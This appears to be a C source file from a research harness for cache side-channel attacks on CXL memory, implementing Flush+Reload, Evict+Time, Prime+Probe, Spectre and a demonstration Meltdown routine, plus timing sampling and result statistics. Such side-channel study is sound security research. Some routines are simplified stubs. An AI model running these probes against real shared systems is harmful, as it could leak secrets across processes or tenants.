#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include "cxl_attacker.h"
#include "cxl_attack_primitives.h"
#include "cxl_common.h"

/* ====== 攻击者状态管理 ====== */
static struct {
    int cpu_id;
    int initialized;
    int running;
} attacker_state = {0};

/* ====== 初始化与清理 ====== */
int cxl_attacker_init(int cpu_id) {
    if (cxl_bind_to_cpu(cpu_id) < 0) {
        fprintf(stderr, "[ERROR] Failed to bind attacker to CPU %d\n", cpu_id);
        return -1;
    }
    
    attacker_state.cpu_id = cpu_id;
    attacker_state.initialized = 1;
    
    fprintf(stdout, "[INFO] Attacker initialized on CPU %d\n", cpu_id);
    
    return 0;
}

int cxl_attacker_cleanup(void) {
    attacker_state.initialized = 0;
    attacker_state.running = 0;
    
    fprintf(stdout, "[INFO] Attacker cleanup completed\n");
    
    return 0;
}

/* ====== Flush + Reload 攻击 ====== */
int cxl_attacker_flush_reload(void *victim_data, attack_result_t *result) {
    if (!victim_data || !result) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    memset(result, 0, sizeof(attack_result_t));
    
    /* Flush 步骤：清除目标地址 */
    cxl_flush_clflush(victim_data);
    cxl_mfence();
    
    /* 间隔：给受害者时间访问内存 */
    for (volatile int i = 0; i < 1000; i++) {}
    
    /* Reload 步骤：探测缓存状态 */
    uint64_t access_time = cxl_probe_access_time(victim_data, NULL);
    
    /* 判断命中/未命中 */
    uint64_t threshold = cxl_get_timing_threshold();
    result->is_hit = (access_time < threshold) ? 1 : 0;
    result->victim_access_time = access_time;
    result->attacker_probe_time = access_time;
    
    if (result->is_hit) {
        result->hit_count++;
    } else {
        result->miss_count++;
    }
    
    return 0;
}

/* ====== Evict + Time 攻击 ====== */
int cxl_attacker_evict_time(void *victim_data, void **evict_set, 
                            int evict_set_size, attack_result_t *result) {
    if (!victim_data || !evict_set || !result) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    memset(result, 0, sizeof(attack_result_t));
    
    /* Evict 步骤：通过访问替换集驱逐目标 */
    for (int i = 0; i < evict_set_size; i++) {
        cxl_probe_access_time(evict_set[i], NULL);
    }
    cxl_mfence();
    
    /* Time 步骤：测量目标地址的访问时间 */
    uint64_t access_time = cxl_probe_access_time(victim_data, NULL);
    
    result->is_hit = 0;  /* Evict 通常导致 Miss */
    result->attacker_probe_time = access_time;
    result->miss_count++;
    
    return 0;
}

/* ====== Spectre 攻击 ====== */
int cxl_attacker_spectre(void *gadget_addr, int condition, attack_result_t *result) {
    if (!gadget_addr || !result) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    memset(result, 0, sizeof(attack_result_t));
    
    /* 执行推测执行 gadget */
    uint64_t access_time = cxl_spectre_variant(
        &condition, 
        gadget_addr, 
        gadget_addr
    );
    
    uint64_t threshold = cxl_get_timing_threshold();
    result->is_hit = (access_time < threshold) ? 1 : 0;
    result->attacker_probe_time = access_time;
    
    return 0;
}

/* ====== Meltdown 攻击 ====== */
int cxl_attacker_meltdown(void *target_addr, attack_result_t *result) {
    if (!target_addr || !result) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    memset(result, 0, sizeof(attack_result_t));
    
    /* Meltdown 尝试访问受保护内存 */
    volatile uint64_t access_time = 0;
    
    /* 尝试访问受保护内存并捕获任何错误 */
    volatile uint64_t *ptr = (volatile uint64_t *)target_addr;
    
    /* 注意：在现代内核中，直接访问受保护内存会导致 SIGSEGV */
    /* 这里提供的是一个演示实现 */
    uint64_t start = cxl_rdtscp(NULL);
    
    /* 尝试读取内存（可能导致异常） */
    (void)(*ptr);
    
    uint64_t end = cxl_rdtscp(NULL);
    access_time = end - start;
    
    result->attacker_probe_time = access_time;
    
    return 0;
}

/* ====== Prime + Probe 攻击 ====== */
int cxl_attacker_prime_probe(void **target_set, int set_size, attack_result_t *result) {
    if (!target_set || set_size <= 0 || !result) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    memset(result, 0, sizeof(attack_result_t));
    
    /* Prime 步骤：填充缓存 */
    for (int i = 0; i < set_size; i++) {
        cxl_probe_access_time(target_set[i], NULL);
    }
    cxl_mfence();
    
    /* 间隔：给受害者运行时间 */
    for (volatile int i = 0; i < 10000; i++) {}
    
    /* Probe 步骤：探测缓存状态 */
    uint64_t total_time = 0;
    int hit_count = 0;
    
    for (int i = 0; i < set_size; i++) {
        uint64_t access_time = cxl_probe_access_time(target_set[i], NULL);
        total_time += access_time;
        
        uint64_t threshold = cxl_get_timing_threshold();
        if (access_time < threshold) {
            hit_count++;
        }
    }
    
    result->hit_count = hit_count;
    result->attacker_probe_time = total_time / set_size;
    result->is_hit = (hit_count > 0) ? 1 : 0;
    
    return 0;
}

/* ====== 地址探测 ====== */
int cxl_attacker_probe_addresses(void **addrs, int num_addrs, 
                                 uint64_t *timings, int *num_timings) {
    if (!addrs || num_addrs <= 0 || !timings || !num_timings) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    cxl_probe_multiple(addrs, num_addrs, timings);
    *num_timings = num_addrs;
    
    return 0;
}

/* ====== 驱逐集 ====== */
int cxl_attacker_evict_set(void **evict_set, int set_size) {
    if (!evict_set || set_size <= 0) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    for (int i = 0; i < set_size; i++) {
        cxl_reload(evict_set[i]);
    }
    cxl_mfence();
    
    return 0;
}

/* ====== 预热 ====== */
int cxl_attacker_warmup(uint64_t warmup_iterations) {
    if (warmup_iterations == 0) return 0;
    
    /* 执行一些虚拟操作来预热 CPU 缓存 */
    volatile uint64_t dummy[1024];
    
    for (uint64_t i = 0; i < warmup_iterations; i++) {
        for (int j = 0; j < 1024; j++) {
            dummy[j] = i * j;
        }
    }
    
    return 0;
}

/* ====== 时序旁路 ====== */
int cxl_attacker_timing_sidechannel(void *victim_addr, uint64_t threshold,
                                    int num_samples, uint64_t *samples) {
    if (!victim_addr || !samples || num_samples <= 0) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    if (!attacker_state.initialized) {
        fprintf(stderr, "[ERROR] Attacker not initialized\n");
        return -1;
    }
    
    for (int i = 0; i < num_samples; i++) {
        /* Flush 步骤 */
        cxl_flush_clflush(victim_addr);
        cxl_mfence();
        
        /* 间隔 */
        for (volatile int j = 0; j < 100; j++) {}
        
        /* Reload 测时 */
        samples[i] = cxl_probe_access_time(victim_addr, NULL);
    }
    
    return 0;
}

/* ====== 噪声消除 ====== */
int cxl_attacker_noise_filtering(const uint64_t *raw_samples, int num_samples,
                                 uint64_t *filtered_samples) {
    if (!raw_samples || !filtered_samples || num_samples <= 0) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    /* 使用简单的中位数滤波 */
    if (num_samples < 3) {
        memcpy(filtered_samples, raw_samples, num_samples * sizeof(uint64_t));
        return 0;
    }
    
    /* 计算滑动窗口中位数 */
    for (int i = 0; i < num_samples; i++) {
        if (i == 0 || i == num_samples - 1) {
            filtered_samples[i] = raw_samples[i];
        } else {
            /* 排序三个值并取中间值 */
            uint64_t samples[3] = {raw_samples[i-1], raw_samples[i], raw_samples[i+1]};
            
            for (int j = 0; j < 3; j++) {
                for (int k = j + 1; k < 3; k++) {
                    if (samples[j] > samples[k]) {
                        uint64_t tmp = samples[j];
                        samples[j] = samples[k];
                        samples[k] = tmp;
                    }
                }
            }
            
            filtered_samples[i] = samples[1];
        }
    }
    
    return 0;
}

/* ====== 访问模式收集 ====== */
int cxl_attacker_collect_pattern(void *victim_addr, int num_probes, uint8_t *pattern) {
    if (!victim_addr || !pattern || num_probes <= 0) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    uint64_t threshold = cxl_get_timing_threshold();
    
    for (int i = 0; i < num_probes; i++) {
        uint64_t access_time = cxl_probe_access_time(victim_addr, NULL);
        pattern[i] = (access_time < threshold) ? 1 : 0;
        
        /* 重新 Flush 以进行下一次探测 */
        cxl_flush_clflush(victim_addr);
        cxl_mfence();
    }
    
    return 0;
}

/* ====== 线程主循环 ====== */
void *cxl_attacker_thread_main(void *arg) {
    int cpu_id = *(int *)arg;
    
    if (cxl_attacker_init(cpu_id) < 0) {
        return NULL;
    }
    
    attacker_state.running = 1;
    
    while (attacker_state.running) {
        /* 等待工作 */
        sleep(1);
    }
    
    cxl_attacker_cleanup();
    
    return NULL;
}

/* ====== 重复攻击 ====== */
int cxl_attacker_repeat_attack(attack_func_t attack_func, void *arg,
                               int num_repeats, attack_result_t *results) {
    if (!attack_func || num_repeats <= 0 || !results) {
        fprintf(stderr, "[ERROR] Invalid parameters\n");
        return -1;
    }
    
    for (int i = 0; i < num_repeats; i++) {
        if (attack_func(arg, &results[i]) < 0) {
            fprintf(stderr, "[WARNING] Attack %d failed\n", i);
            continue;
        }
        results[i].attack_id = i;
    }
    
    return 0;
}

/* ====== 成功率计算 ====== */
float cxl_attacker_success_rate(const attack_result_t *results, int num_results) {
    if (!results || num_results <= 0) {
        return 0.0f;
    }
    
    int successful = 0;
    for (int i = 0; i < num_results; i++) {
        if (results[i].is_hit) {
            successful++;
        }
    }
    
    return (float)successful / num_results;
}
